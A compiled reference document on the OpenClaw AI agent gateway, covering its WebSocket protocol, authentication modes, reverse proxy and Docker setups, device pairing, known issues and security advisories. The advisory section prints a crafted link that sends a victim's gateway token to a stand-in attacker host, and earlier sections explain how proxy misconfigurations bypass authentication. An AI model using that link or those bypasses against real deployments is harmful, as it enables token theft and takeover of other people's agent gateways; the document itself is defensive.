# OpenClaw Comprehensive Reference Document

> Compiled 2026-02-02 from official docs, GitHub issues, security advisories, and community resources.
> OpenClaw was formerly known as Clawdbot and Moltbot.

---

## Table of Contents

1. [Gateway Architecture](#1-gateway-architecture)
2. [Security Model](#2-security-model)
3. [Reverse Proxy Setup](#3-reverse-proxy-setup)
4. [CLI Commands](#4-cli-commands)
5. [Configuration File (openclaw.json)](#5-configuration-file-openclawjson)
6. [Control UI (WebUI) Authentication](#6-control-ui-webui-authentication)
7. [Device Pairing Mechanism](#7-device-pairing-mechanism)
8. [DigitalOcean 1-Click Deploy](#8-digitalocean-1-click-deploy)
9. [Docker Deployments](#9-docker-deployments)
10. [Known Issues and Gotchas](#10-known-issues-and-gotchas)
11. [Security Advisories](#11-security-advisories)
12. [Quick Reference: Configuration Examples](#12-quick-reference-configuration-examples)

---

## 1. Gateway Architecture

### What the Gateway Is

The Gateway is the **single long-running process** that owns all channel connections (WhatsApp/Baileys, Telegram, Discord, Slack, etc.) and the WebSocket control plane. It replaced the legacy `gateway` command. Every CLI operation, Control UI interaction, and messaging channel flows through this process.

### Network Architecture

- **Single port multiplexing**: WebSocket control plane + HTTP endpoints on one port (default: `18789`)
- **Canvas file server**: Runs separately on `canvasHost.port` (default: `18793`), serving from `~/.openclaw/workspace/canvas`
- **Default binding**: `127.0.0.1:18789` (loopback only)

### HTTP Endpoints Exposed

The Gateway exposes several HTTP APIs on the same port:
- `/v1/chat/completions` -- OpenAI Chat Completions compatible
- `/v1/responses` -- OpenResponses
- `/tools/invoke` -- Tools invocation
- `/` -- Control UI (Vite + Lit SPA, served by the Gateway itself)

### Binding Modes

Set via `gateway.bind` config or `--bind` flag:

| Mode | Behavior |
|------|----------|
| `loopback` (default) | Binds to `127.0.0.1` -- local clients only |
| `lan` | Binds to LAN-facing interface |
| `tailnet` | Binds to Tailscale interface IP |
| `auto` | Auto-detect appropriate interface |
| `custom` | User-specified bind address |

**Critical rule**: Non-loopback bindings (`lan`, `tailnet`, `custom`) **require** a shared token or password. The Gateway refuses to start if you bind to `0.0.0.0` without authentication configured.

### Port Precedence

Priority order (highest first):
1. `--port` CLI flag
2. `OPENCLAW_GATEWAY_PORT` environment variable
3. `gateway.port` in config file
4. Default: `18789`

### WebSocket Protocol

#### Handshake (Mandatory First Frame)

Client must send as the very first WebSocket frame:
```json
{
  "type": "req",
  "id": "<unique-id>",
  "method": "connect",
  "params": {
    "minProtocol": 1,
    "maxProtocol": 1,
    "client": {
      "id": "<client-id>",
      "displayName": "My Client",
      "version": "1.0.0",
      "platform": "linux",
      "deviceFamily": "desktop",
      "mode": "cli",
      "instanceId": "<stable-instance-id>"
    },
    "caps": {},
    "auth": {
      "token": "<gateway-auth-token>"
    },
    "locale": "en",
    "userAgent": "..."
  }
}
```

Gateway responds with:
```json
{
  "type": "res",
  "id": "<same-id>",
  "ok": true,
  "payload": {
    "presence": [...],
    "health": {...},
    "stateVersion": 42,
    "uptimeMs": 123456,
    "policy": {...}
  }
}
```

**Key detail**: The `auth.token` (or `auth.password`) field in `connect.params` is how ALL clients authenticate -- CLI, Control UI, macOS app, mobile nodes, etc. There is no separate HTTP header-based auth for the WebSocket upgrade; the token is sent **inside the first WebSocket message**.

#### Message Types

| Type | Direction | Format |
|------|-----------|--------|
| Request | Client -> Gateway | `{type:"req", id, method, params}` |
| Response | Gateway -> Client | `{type:"res", id, ok, payload\|error}` |
| Event | Gateway -> Client | `{type:"event", event, payload, seq?, stateVersion?}` |

#### Core Methods

- `health` -- full health snapshot
- `status` -- brief summary
- `system-presence` -- current presence list
- `send` -- transmit messages to channels
- `agent` -- run agent turn (two-stage: ack then completion via streaming events)
- `node.list`, `node.describe`, `node.invoke` -- node management
- `node.pair.*` -- pairing lifecycle
- `config.apply` -- full config replacement (requires `baseHash`)
- `config.patch` -- JSON merge patch for partial updates
- `config.schema` -- returns JSON Schema for config (used by UI)

#### Event Types

- `agent` -- streamed tool/output events (seq-tagged for gap detection)
- `presence` -- presence deltas with stateVersion
- `tick` -- periodic keepalive
- `shutdown` -- Gateway exit notification

**Events are NOT replayed**. If a client misses events (seq gap), it must refresh health/presence data.

### Hot Reload

The Gateway watches `~/.openclaw/openclaw.json` (or `OPENCLAW_CONFIG_PATH`) for changes:
- **hybrid** mode (default): reloads safe changes without restart
- **off** mode: no hot reload
- `SIGUSR1` triggers in-process restart when authorized

### No Fallback Guarantee

"No fallback to direct Baileys connections; if the Gateway is down, sends fail fast." The Gateway is the single point of truth.

---

## 2. Security Model

### Authentication Modes

Since v2026.1.29, auth mode `"none"` has been **removed**. The Gateway is now **fail-closed** by default:

| Mode | Config Key | How Client Sends |
|------|-----------|-----------------|
| Token | `gateway.auth.mode: "token"` | `connect.params.auth.token` in WS handshake |
| Password | `gateway.auth.mode: "password"` | `connect.params.auth.password` in WS handshake |
| Tailscale Serve | `gateway.auth.allowTailscale: true` | Tailscale identity headers (`tailscale-user-login`) |

Token can be set via:
- `gateway.auth.token` in `openclaw.json`
- `OPENCLAW_GATEWAY_TOKEN` environment variable
- Auto-generated and persisted to `<STATE_DIR>/gateway.token` if not explicitly set

**Important distinction**: `gateway.auth.token` is for local/WebSocket authentication. `gateway.remote.token` is for **remote CLI operations only** and does NOT protect local WebSocket access.

### `trustedProxies` -- What It Does

**Config key**: `gateway.trustedProxies`
**Type**: Array of IP addresses (strings)

When the Gateway receives a connection, it checks the source IP:
- If the source IP is in `trustedProxies`, the Gateway trusts `X-Forwarded-For` / `X-Real-IP` headers from that connection to determine the **real** client IP
- The real client IP is then used for **local client detection** (loopback connections get special trust, like auto-approve pairing)
- If the source IP is NOT in `trustedProxies` but proxy headers are present, the Gateway **ignores** the headers and treats the connection as coming from the source IP itself

**Why this matters**: Without `trustedProxies`, a reverse proxy on `127.0.0.1` sending `X-Forwarded-For: <real-client-ip>` would cause the Gateway to see the proxy's IP (`127.0.0.1`) as the client. This would make ALL proxied connections appear to be local, **bypassing authentication entirely**.

**Conversely**, if your proxy is at `127.0.0.1` and you DO set `trustedProxies: ["127.0.0.1"]`, the Gateway reads `X-Forwarded-For` to get the real external IP, correctly treating those connections as remote (requiring auth).

**Configuration example**:
```json
{
  "gateway": {
    "trustedProxies": ["127.0.0.1"]
  }
}
```

**Critical requirements for the reverse proxy**:
1. The proxy MUST **overwrite** (not append to) the `X-Forwarded-For` header to prevent IP spoofing
2. Direct access to the Gateway port (18789) must be blocked by firewall -- all traffic must go through the proxy

### `allowInsecureAuth` -- What It Does

**Config key**: `gateway.controlUi.allowInsecureAuth`
**Type**: Boolean (default: `false`)

The Control UI needs a **secure context** (HTTPS or `localhost`) to use WebCrypto for generating a device identity (a cryptographic keypair). This device identity is used for device pairing.

When `allowInsecureAuth: true`:
- The Control UI falls back to **token-only authentication**
- Device pairing is **skipped** when the device identity is absent (i.e., when accessed over plain HTTP from a non-localhost address)
- This is explicitly documented as a **security downgrade**

When `allowInsecureAuth: false` (default):
- The Control UI requires either HTTPS or localhost to generate device identity
- Without device identity, the connection is rejected
- This prevents unauthenticated access from non-secure contexts

### `dangerouslyDisableDeviceAuth`

**Config key**: `gateway.controlUi.dangerouslyDisableDeviceAuth`
**Type**: Boolean (default: `false`)

This is the **break-glass** option. It completely disables device identity checks for the Control UI. The docs say: "a severe security downgrade; keep it off unless you are actively debugging and can revert quickly." `openclaw security audit` emits a warning when this is enabled.

### Tailscale Serve Identity

When `gateway.auth.allowTailscale: true` (default when using Tailscale Serve):
- The Gateway accepts `tailscale-user-login` identity headers
- It validates by resolving the `x-forwarded-for` address through the local Tailscale daemon and matching it to the header
- **CRITICAL**: If you terminate TLS with your OWN reverse proxy (nginx/Caddy) in front of the Gateway, you MUST disable `allowTailscale` and use token/password auth instead. Otherwise an attacker could forge the `tailscale-user-login` header.

### Access Control Layers

Beyond gateway auth, OpenClaw has channel-level access control:

| Setting | Values | Purpose |
|---------|--------|---------|
| `dmPolicy` | `pairing` (default), `allowlist`, `open`, `disabled` | Gates direct messages |
| `groupPolicy` | `allowlist`, `open`, `disabled` | Gates group/room messages |
| `allowFrom` | Array of E.164 numbers or user IDs | Explicit allowlist |
| `groupAllowList` | Array of group/channel IDs | Explicit group allowlist |

### Secret Storage Locations

All require tight permissions (`700` directories, `600` files):
- `~/.openclaw/credentials/` -- channel credentials, pairing allowlists
- `~/.openclaw/agents/<agentId>/agent/auth-profiles.json` -- API keys, OAuth tokens
- `~/.openclaw/agents/<agentId>/sessions/*.jsonl` -- unencrypted transcripts
- `~/.openclaw/nodes/paired.json` -- paired node tokens (secrets!)
- `~/.openclaw/nodes/pending.json` -- pending pairing requests

### mDNS / Bonjour Discovery

Three modes for information disclosure:
- `"minimal"` (default) -- omits filesystem paths and SSH info
- `"off"` -- disables discovery entirely
- `"full"` (opt-in) -- includes `cliPath` and `sshPort`

### Security Audit

```bash
openclaw security audit          # Basic audit
openclaw security audit --deep   # Comprehensive audit
openclaw security audit --fix    # Auto-fix: tighten groupPolicy, fix permissions
```

Checks: inbound access policies, tool blast radius, network exposure, browser control, filesystem permissions, plugins, model hygiene.

---

## 3. Reverse Proxy Setup

### Architecture When Behind a Proxy

```
Internet -> Caddy/Nginx (TLS termination, port 443)
         -> 127.0.0.1:18789 (OpenClaw Gateway, loopback only)
```

The Gateway stays on loopback. The reverse proxy handles TLS and forwards to it.

### Required OpenClaw Configuration

```json
{
  "gateway": {
    "mode": "local",
    "bind": "loopback",
    "port": 18789,
    "trustedProxies": ["127.0.0.1"],
    "auth": {
      "mode": "token",
      "token": "your-secret-token-here",
      "allowTailscale": false
    },
    "controlUi": {
      "enabled": true,
      "allowInsecureAuth": false
    }
  }
}
```

Key points:
- `trustedProxies: ["127.0.0.1"]` because the proxy runs on localhost
- `allowTailscale: false` because you are terminating TLS yourself (not Tailscale Serve)
- Token auth enabled so all WebSocket clients must authenticate

### Nginx Configuration

```nginx
upstream openclaw_gateway {
    server 127.0.0.1:18789;
}

server {
    listen 443 ssl;
    server_name openclaw.example.com;

    ssl_certificate     /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://openclaw_gateway;

        # WebSocket upgrade headers (REQUIRED)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        # Real IP forwarding (REQUIRED for trustedProxies)
        # Use proxy_set_header to OVERWRITE, not append
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Host $host;

        # WebSocket timeout -- connections stay open indefinitely
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
}
```

**IMPORTANT**: Use `$remote_addr` (not `$proxy_add_x_forwarded_for`) for `X-Forwarded-For` to overwrite rather than append. This prevents IP spoofing via client-supplied headers.

### Caddy Configuration

```
openclaw.example.com {
    reverse_proxy 127.0.0.1:18789
}
```

Caddy automatically handles:
- TLS via Let's Encrypt
- WebSocket upgrade
- Proper `X-Forwarded-For` headers (overwrites by default)

For IP-address-based TLS (no domain), DigitalOcean's deploy uses Caddy's ability to issue Let's Encrypt certificates for IP addresses.

### What NOT to Do

1. **Do NOT forward `tailscale-user-login` headers** from your own proxy. Disable `gateway.auth.allowTailscale` when using your own proxy.
2. **Do NOT append to `X-Forwarded-For`** -- always overwrite it.
3. **Do NOT expose port 18789 directly** -- firewall it so only the proxy can reach it.
4. **Do NOT use `proxy_set_header Authorization "Bearer ${GATEWAY_TOKEN}"`** to inject auth at the proxy level. The Gateway expects the token in the WebSocket `connect` message payload (`connect.params.auth.token`), NOT in HTTP headers. The nginx Authorization header approach is used by some Docker images (like coollabsio/openclaw-docker) for their HTTP basic auth layer on top, but this is a SEPARATE authentication layer -- not the Gateway's own WebSocket auth.

### How Auth Actually Works Behind a Proxy

The authentication flow when behind a reverse proxy:

1. Browser loads Control UI HTML/JS from `https://openclaw.example.com/` (proxied to Gateway)
2. Control UI JavaScript opens a WebSocket to `wss://openclaw.example.com/` (proxied to Gateway's WS endpoint)
3. The first WebSocket frame from the client includes `connect.params.auth.token` with the gateway token
4. The Gateway validates the token from the WebSocket message payload
5. If `trustedProxies` is configured, the Gateway reads `X-Forwarded-For` to determine the real client IP
6. Based on the real client IP, the Gateway decides if this is a "local" or "remote" connection (affects auto-pairing behavior)

**The reverse proxy is transparent to WebSocket auth** -- it just passes through the WebSocket frames. The proxy does NOT need to inject any Authorization header for the Gateway's own auth. The token travels inside the WebSocket protocol.

---

## 4. CLI Commands

### Gateway Lifecycle

```bash
# Start gateway in foreground
openclaw gateway
openclaw gateway run                # Explicit run subcommand
openclaw gateway --port 18789       # Specify port
openclaw gateway --verbose          # Debug logging
openclaw gateway --force            # Kill existing listeners first
openclaw gateway --bind loopback    # Explicit bind mode
openclaw gateway --auth token       # Explicit auth mode
openclaw gateway --tailscale serve  # Enable Tailscale Serve
openclaw gateway --tailscale off    # Disable Tailscale

# Dev mode (isolated state/config, derived ports)
openclaw --dev gateway --allow-unconfigured
openclaw --dev gateway --reset      # Reset dev environment
```

### Service Management

```bash
# Install as system service (launchd on macOS, systemd on Linux)
openclaw gateway install
openclaw gateway install --force    # Reinstall (for config/path changes)

# Lifecycle
openclaw gateway start
openclaw gateway stop
openclaw gateway restart
openclaw gateway uninstall

# Status
openclaw gateway status             # Service + optional RPC check
openclaw gateway status --json      # Machine-readable
```

#### What `gateway install` Does

**macOS (launchd)**:
- Writes a plist to `~/Library/LaunchAgents/bot.molt.gateway.plist` (or `bot.molt.<profile>.plist`)
- Registers as a per-user LaunchAgent
- The service supervisor keeps the process alive
- **Known issue (#3780)**: `gateway stop` uses `launchctl bootout` which completely unloads the service, causing subsequent `gateway start` to fail. Workaround: `gateway install --force` to re-register.

**Linux/WSL2 (systemd)**:
- Creates `~/.config/systemd/user/openclaw-gateway.service` (or `openclaw-gateway-<profile>.service`)
- Uses systemd user services (not system-level)
- **Requires** `sudo loginctl enable-linger <username>` for the service to persist after logout

**Windows**:
- Uses `schtasks` (Windows Task Scheduler)

**Important**: `gateway install` is a no-op if already installed. Use `--force` to reinstall when you change profiles, env vars, or paths.

The installed service requires `gateway.mode=local` in the config to start. Without it, the Gateway refuses to boot.

### Diagnostic Commands

```bash
# Health probe
openclaw gateway health
openclaw gateway health --json

# Comprehensive debug probe (checks configured remote + localhost)
openclaw gateway probe

# Low-level RPC call
openclaw gateway call <method>

# Discovery (Bonjour/DNS-SD scan)
openclaw gateway discover
openclaw gateway discover --timeout 5000
```

### Onboarding

```bash
# Interactive setup wizard
openclaw onboard
openclaw onboard --install-daemon   # Also install the service

# Non-interactive (for automation)
openclaw onboard --non-interactive \
  --gateway-port 18789 \
  --gateway-bind loopback
```

The wizard handles:
- Gateway mode selection (local vs remote)
- Authentication setup (OAuth/CodeX or API keys)
- Channel provider configuration (WhatsApp QR, Telegram token, etc.)
- Daemon installation
- Gateway token generation (auto-generated and stored in `gateway.auth.token`)

### Configuration Doctor

```bash
openclaw doctor                        # Diagnose config issues
openclaw doctor --generate-gateway-token  # Generate a new token
```

The doctor command validates the config against the schema and reports issues without writing changes unless explicitly authorized. It is one of the few commands that works even when the Gateway refuses to start due to config errors.

### Other Important Commands

```bash
# General status
openclaw status
openclaw status --all               # Comprehensive debug report
openclaw health

# Logs
openclaw logs
openclaw logs --follow

# Security audit
openclaw security audit --deep
openclaw security audit --fix

# Device/pairing management
openclaw devices list
openclaw devices approve <requestId>
openclaw nodes pending
openclaw nodes approve <requestId>
openclaw nodes reject <requestId>
openclaw nodes status
openclaw nodes rename --node <id> --name "Name"

# Channel pairing
openclaw pairing list whatsapp
openclaw pairing approve whatsapp <code>
openclaw channels login              # WhatsApp QR scan

# Configuration
openclaw configure --section web     # Configure web/search settings
```

---

## 5. Configuration File (openclaw.json)

### File Location

- Default: `~/.openclaw/openclaw.json`
- Override: `OPENCLAW_CONFIG_PATH` environment variable
- Format: **JSON5** (allows comments and trailing commas)
- Schema: Strict validation -- unknown keys, malformed types, or invalid values cause the Gateway to refuse to start

### Gateway-Related Settings

```json5
{
  "gateway": {
    // Core
    "mode": "local",                    // "local" or "remote"
    "port": 18789,                      // WebSocket port
    "bind": "loopback",                 // "loopback", "lan", "tailnet", "auto", "custom"

    // Authentication
    "auth": {
      "mode": "token",                  // "token" or "password"
      "token": "your-token",            // or use OPENCLAW_GATEWAY_TOKEN env
      "password": "${OPENCLAW_GATEWAY_PASSWORD}",  // Variable substitution supported
      "allowTailscale": false           // Accept Tailscale Serve identity headers
    },

    // Reverse proxy
    "trustedProxies": ["127.0.0.1"],    // Array of trusted proxy IPs

    // Control UI
    "controlUi": {
      "enabled": true,
      "basePath": "/",                  // Custom base path
      "allowInsecureAuth": false,       // Allow token-only auth without device identity
      "dangerouslyDisableDeviceAuth": false  // Break-glass: disable all device checks
    },

    // Remote CLI access
    "remote": {
      "url": "ws://127.0.0.1:18789",
      "token": "remote-cli-token",      // Separate from gateway.auth.token
      "tlsFingerprint": "..."           // Optional TLS pinning for wss://
    }
  },

  // Canvas server
  "canvasHost": {
    "enabled": true,
    "port": 18793
  },

  // Agent configuration
  "agents": {
    "defaults": {
      "workspace": "~/.openclaw/workspace",
      "model": {
        "primary": "anthropic/claude-opus-4-5",
        "fallbacks": ["openai/gpt-4o"]
      },
      "sandbox": {
        "mode": "non-main",             // "off", "non-main", "all"
        "scope": "session",             // "session", "agent", "shared"
        "docker": { /* resource limits, network policies */ }
      }
    }
  },

  // Channel configuration
  "channels": {
    "whatsapp": {
      "dmPolicy": "pairing",           // "pairing", "allowlist", "open", "disabled"
      "allowFrom": ["+15555550123"],
      "groupPolicy": "allowlist",       // "allowlist", "open", "disabled"
      "groupAllowList": ["group-id"]
    },
    "telegram": { /* similar structure */ },
    "discord": { /* similar structure */ },
    "slack": { /* similar structure */ }
  },

  // Session management
  "session": {
    "scope": "per-sender",             // "per-sender", "per-channel-peer", etc.
    "reset": { "mode": "daily" },      // "daily" or "idle"
    "resetTriggers": ["/new", "/reset"]
  },

  // Message handling
  "messages": {
    "responsePrefix": "",
    "ackReaction": "emoji",
    "queue": { "mode": "collect" },     // "collect", "steer", "followup"
    "inbound": { "debounceMs": 1000 }
  },

  // Tools
  "tools": {
    "allow": ["*"],                     // Global tool allowlist
    "deny": [],                         // Global tool denylist
    "elevated": { /* per-channel elevated tools */ }
  },

  // Environment
  "env": {
    "shellEnv": true                    // Load missing env vars from shell profile
  }
}
```

### Variable Substitution

String values support `${VAR_NAME}` syntax (uppercase only). Combined with `config.env`, this allows:
```json5
{
  "gateway": {
    "auth": {
      "password": "${OPENCLAW_GATEWAY_PASSWORD}"
    }
  }
}
```

### Config Includes

Split config across files:
```json5
{
  "agents": { "$include": "./agents.json5" },
  "broadcast": { "$include": ["./clients/a.json5", "./clients/b.json5"] }
}
```
Relative paths resolve from the including file. Nested includes supported up to 10 levels.

### Config Modification via API

- `config.apply` -- Full replacement. Requires `baseHash` to prevent concurrent edit conflicts.
- `config.patch` -- JSON merge patch. Objects merge recursively; `null` deletes keys; arrays replace entirely.
- `config.schema` -- Returns JSON Schema so UI can render dynamic forms.

---

## 6. Control UI (WebUI) Authentication

### What the Control UI Is

A **Vite + Lit single-page application** served directly by the Gateway on port 18789 at `/` (or custom `basePath`). It communicates with the Gateway over the **same WebSocket endpoint** on the same port.

### Authentication Flow (Step by Step)

1. **Page Load**: Browser requests `https://your-domain/` -- the Gateway serves the SPA HTML/JS/CSS
2. **Token Storage**: The Control UI stores the gateway token in **localStorage** after first entry. Passwords are kept in-memory only (not persisted).
3. **WebSocket Connect**: The UI opens a WebSocket to the same origin (`wss://your-domain/` or `ws://localhost:18789/`)
4. **First Frame Auth**: The first WebSocket message is the `connect` request with `params.auth.token` (or `params.auth.password`) inside the payload
5. **Device Identity**: If the browser has a secure context (HTTPS or localhost), the UI generates a **device identity** using WebCrypto (a cryptographic keypair stored in the browser)
6. **Device Pairing**: If this device identity is new (unseen by the Gateway), the connection enters "pairing required" state until approved

### Token Delivery Mechanism

The token is delivered **inside the WebSocket connect message payload**, NOT via:
- NOT via URL query parameters (this was a security vulnerability -- see GHSA-g8p2-7wf7-98mq)
- NOT via HTTP Authorization headers
- NOT via cookies

The token is stored in `localStorage` for persistence across page loads.

**Historical note**: Earlier versions allowed `?token=xxx` in the URL and `?gatewayUrl=ws://...` in query params. The `gatewayUrl` parameter was exploited for token exfiltration (CVE in v2026.1.28). Since v2026.1.29, users must confirm any new gateway URL.

### The Device Identity Layer

On top of token auth, the Control UI implements device-level identity:

1. Browser uses WebCrypto to generate an ECDSA keypair
2. The public key becomes the device's identity
3. On first connection with a new device identity, the Gateway requires **pairing approval**
4. Paired devices are remembered; subsequent connections with the same device identity skip pairing

**Requirements for device identity generation**:
- HTTPS context, OR
- localhost/127.0.0.1 access

Without a secure context, WebCrypto is unavailable and device identity cannot be generated.

### Fallback Modes

| Scenario | Device Identity | Behavior |
|----------|----------------|----------|
| HTTPS + token | Generated | Full auth: token + device pairing |
| localhost + token | Generated | Full auth: token + device auto-approved |
| HTTP (non-localhost) + token + `allowInsecureAuth: true` | Not generated | Token-only auth, pairing skipped |
| HTTP (non-localhost) + token + `allowInsecureAuth: false` | Not generated | **Connection rejected** |
| Any + `dangerouslyDisableDeviceAuth: true` | Ignored | Token-only, no device checks at all |

### Remote Access via SSH Tunnel

When you SSH tunnel to the Gateway:
```bash
ssh -N -L 18789:127.0.0.1:18789 user@host
```
The browser accesses `http://localhost:18789/` which is a secure context (localhost). Device identity is generated, local auto-approve applies. This is the simplest way to access the Control UI remotely without any reverse proxy complexity.

### Connecting the Dev Server to a Remote Gateway

For development:
```bash
pnpm ui:dev
# Access: http://localhost:5173/?gatewayUrl=ws://<gateway-host>:18789
```
The `gatewayUrl` parameter and auth credentials persist in localStorage.

---

## 7. Device Pairing Mechanism

### Overview

OpenClaw implements **Gateway-owned pairing** where the Gateway is the authority for which devices/nodes can connect. UI frontends (CLI, macOS app, Control UI) serve as approval interfaces.

### Pairing Workflow

1. New client/node connects to Gateway WebSocket
2. Gateway checks if the device identity is known
3. If unknown, Gateway stores a **pending request** and emits `node.pair.requested` event
4. The user sees: `"disconnected (1008): pairing required"`
5. Admin approves via CLI (`openclaw devices approve <id>`) or macOS app
6. Gateway generates a **fresh token** and issues it to the paired device
7. Device reconnects using the new token
8. Pending requests expire after **5 minutes** if unactioned

### Token Rotation

- Tokens are generated fresh on every approval -- never returned from initial requests
- Re-pairing rotates the token (old token becomes invalid)
- To reset a pairing relationship, delete the node entry and re-pair

### Auto-Approval Conditions

| Condition | Auto-Approved? |
|-----------|---------------|
| Connection from `127.0.0.1` / loopback | Yes |
| Same Tailnet (loopback or gateway host) | Yes (for local addresses) |
| macOS app with SSH verification | Yes (silent approval attempt) |
| All other connections | No -- manual approval required |

### Pairing Behind a Reverse Proxy

This is where it gets tricky:

1. The reverse proxy connects to the Gateway from `127.0.0.1`
2. Without `trustedProxies`, the Gateway sees `127.0.0.1` as the client -- **auto-approves everything** (security hole!)
3. With `trustedProxies: ["127.0.0.1"]`, the Gateway reads `X-Forwarded-For` to get the real client IP
4. Real client IP is external -- no auto-approve, manual pairing required
5. But if the client is on plain HTTP (no HTTPS), it cannot generate device identity
6. Without device identity, pairing cannot proceed unless `allowInsecureAuth: true`
7. With `allowInsecureAuth: true`, the token alone is sufficient and pairing is skipped

**Recommended setup behind a proxy**:
- Use HTTPS (via Caddy/nginx with Let's Encrypt)
- Set `trustedProxies: ["127.0.0.1"]`
- Keep `allowInsecureAuth: false` (HTTPS provides secure context)
- Users will need to complete device pairing on first connection
- Approve via `openclaw devices approve <id>` on the server

### Storage

- `~/.openclaw/nodes/paired.json` -- paired devices with tokens (sensitive!)
- `~/.openclaw/nodes/pending.json` -- pending requests

### CLI Commands for Pairing

```bash
# Device pairing (Control UI devices)
openclaw devices list
openclaw devices approve <requestId>

# Node pairing (external nodes)
openclaw nodes pending
openclaw nodes approve <requestId>
openclaw nodes reject <requestId>
openclaw nodes status
openclaw nodes rename --node <id|name|ip> --name "Device Name"

# Channel-specific pairing (Telegram, WhatsApp)
openclaw pairing list <channel>
openclaw pairing approve <channel> <code>
```

---

## 8. DigitalOcean 1-Click Deploy

### Architecture

DigitalOcean's 1-click OpenClaw deploy uses:
- **Caddy** as the TLS-terminating reverse proxy (with Let's Encrypt, even for IP addresses)
- **OpenClaw Gateway** bound to loopback on port 18789
- **Docker container isolation** for agent sandboxing
- **Non-root user** for the OpenClaw process
- **Firewall rules** with rate-limiting

### Security Layers

1. **TLS via Caddy**: Let's Encrypt certificates (supporting IP-based certs without a domain)
2. **Gateway token**: Auto-generated, required for all WebSocket connections
3. **Device pairing**: Ensures only approved devices can interact with the Gateway
4. **Agent containerization**: Agent runs in isolated Docker containers -- "if an agent blows up, it will destroy its container only"
5. **Hardened firewall**: Rate-limiting rules configured

### Caddy Configuration (Inferred)

Based on DigitalOcean's architecture:
```
{your-droplet-ip} {
    reverse_proxy 127.0.0.1:18789
}
```

Caddy handles WebSocket upgrade and `X-Forwarded-For` automatically. TLS is provisioned via Let's Encrypt.

### OpenClaw Configuration (Inferred)

```json
{
  "gateway": {
    "mode": "local",
    "bind": "loopback",
    "port": 18789,
    "trustedProxies": ["127.0.0.1"],
    "auth": {
      "mode": "token",
      "token": "<auto-generated>",
      "allowTailscale": false
    },
    "controlUi": {
      "enabled": true
    }
  },
  "agents": {
    "defaults": {
      "sandbox": {
        "mode": "all",
        "scope": "session"
      }
    }
  }
}
```

---

## 9. Docker Deployments

### Community Docker Image (MaTriXy/openclaw-docker)

Architecture:
```
Port 8080 (nginx) -> Port 18789 (Gateway, loopback)
```

**Nginx layer**:
- Listens on `:8080` as the public-facing port
- Proxies all traffic to internal Gateway on `:18789`
- When `AUTH_PASSWORD` is set, enforces HTTP Basic Auth (username: `admin`) on all routes except `/healthz` and hooks
- If `AUTH_PASSWORD` is not set, no additional auth (relies on Gateway's own auth)

**Key environment variables**:

| Variable | Purpose | Default |
|----------|---------|---------|
| `OPENCLAW_GATEWAY_TOKEN` | Gateway bearer token | Auto-generated, persisted to `<STATE_DIR>/gateway.token` |
| `OPENCLAW_STATE_DIR` | Persistent state directory | `/data/.openclaw` |
| `OPENCLAW_WORKSPACE_DIR` | Project workspace | `/data/workspace` |
| `OPENCLAW_CONFIG_PATH` | Config file location | (default) |
| `AUTH_PASSWORD` | Nginx basic auth password | (unset = no basic auth) |
| `AUTH_USERNAME` | Nginx basic auth username | `admin` |
| `OPENCLAW_DOCKER_APT_PACKAGES` | Extra packages to install at startup | (none) |

**Startup sequence**: Configuration script -> Nginx (background) -> Gateway process

### About Bearer Token in nginx

Some Docker setups use:
```nginx
proxy_set_header Authorization "Bearer ${GATEWAY_TOKEN}";
```

This injects an HTTP Authorization header at the nginx level. However, **this is NOT how the Gateway authenticates WebSocket connections**. The Gateway reads the token from the `connect.params.auth.token` field in the first WebSocket frame. The nginx Authorization header is used for:
- The Docker image's OWN HTTP basic auth layer (separate from Gateway auth)
- Some HTTP API endpoints that may accept bearer tokens
- It does NOT substitute for the WebSocket handshake auth

### Docker + Reverse Proxy Gotchas

**The Docker NAT problem**: When running in Docker (especially Docker Desktop on Windows/Mac), the Gateway sees connections from the Docker bridge IP (e.g., `172.17.0.1`), not `127.0.0.1`. This means:
- Connections are treated as remote, not local
- Auto-approve pairing does not work
- You must set `trustedProxies` to include the Docker bridge IP, or the internal nginx proxy IP

**Known bug (#4941)**: Docker Desktop on Windows causes every WebSocket connection to fail because Docker NAT makes the Gateway see a non-localhost IP, requiring node pairing that cannot be completed.

---

## 10. Known Issues and Gotchas

### Issue #1679: `allowInsecureAuth` Doesn't Bypass Pairing in Docker/Proxy

**Problem**: Setting `gateway.controlUi.allowInsecureAuth: true` does not bypass device pairing when behind reverse proxies.

**Root cause**: The issue is usually that `trustedProxies` is not configured, so the Gateway sees the proxy IP as the client and makes incorrect authentication decisions. The token fails to reach the auth handler properly.

**Solution**: Configure `gateway.trustedProxies` with the proxy's IP address.

### Issue #2248: `allowInsecureAuth` Doesn't Prevent Device Signature Validation

**Problem**: When a secure context IS available (generating device identity), but the signature is expired/stale, `allowInsecureAuth` does not help because it only controls behavior when device identity is **absent**. Creates a deadlock: secure contexts generate identity that gets rejected, non-secure contexts are rejected for being non-secure.

### Issue #4941: Docker Desktop Pairing Failure

**Problem**: Docker NAT on Windows causes Gateway to see non-localhost IPs for all connections, requiring pairing that cannot be completed.

### Issue #3780: `gateway stop` Breaks `gateway start` on macOS

**Problem**: `gateway stop` uses `launchctl bootout` which unloads the LaunchAgent entirely. Subsequent `gateway start` fails because the service is gone.

**Workaround**: Use `openclaw gateway install --force` to re-register, then `gateway start`.

### Issue #1690: Control UI "gateway token missing" Even With Token

**Problem**: The WebSocket connection is rejected with 1008 unauthorized and "gateway token missing" even when the token appears to be configured.

**Causes**: Stale cached gateway URLs in localStorage, incomplete configuration, or proxy misconfiguration.

### The 42,000 Exposed Instances Crisis

Between December 2025 and January 2026, security researchers found 42,665+ publicly exposed OpenClaw instances, with 93.4% having critical authentication bypass vulnerabilities. Root cause: users binding to `0.0.0.0` without tokens, or reverse proxy misconfigurations causing the Gateway to treat external connections as localhost.

---

## 11. Security Advisories

### GHSA-g8p2-7wf7-98mq: 1-Click RCE via Token Exfiltration (Fixed in v2026.1.29)

**Severity**: High (CVSS 8.8)
**Affected**: <= v2026.1.28

**Vulnerability**: The Control UI trusted `gatewayUrl` from URL query parameters without validation and auto-connected on page load, sending the stored gateway token in the WebSocket connect payload. An attacker could craft a link like:
```
https://victim-gateway/?gatewayUrl=wss://attacker.com/
```
The victim's browser would auto-connect to the attacker's server, leaking the token. The attacker could then connect to the victim's Gateway with full operator access.

